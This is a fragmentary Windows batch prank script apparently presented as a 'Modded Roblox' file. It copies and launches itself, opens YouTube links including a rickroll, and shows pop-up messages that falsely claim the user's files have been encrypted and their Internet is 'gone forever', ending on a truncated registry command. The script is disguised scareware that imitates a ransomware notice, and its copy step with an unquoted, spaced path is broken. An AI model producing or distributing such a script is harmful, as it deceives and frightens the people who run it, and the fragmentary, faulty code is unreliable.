...
@echo off
Copy C:\Programs\Modded Roblox.bat C:\Programs
Start C:\Programs\Modded Roblox.bat
...
@Echo off
msg Wanna Watch something funny ?
timeout 50
start
https://www.youtube.com/watch?v=j9V78UbdzWI
start 
https://youtu.be/dQw4w9WgXcQ
msg Oh ok well i got it
msg You had enough ?
msg Want more ?
...
msg oops it looks like your important data and files have been encrypted
msg Also Your Internet is gone forever ;)
@echo off
reg
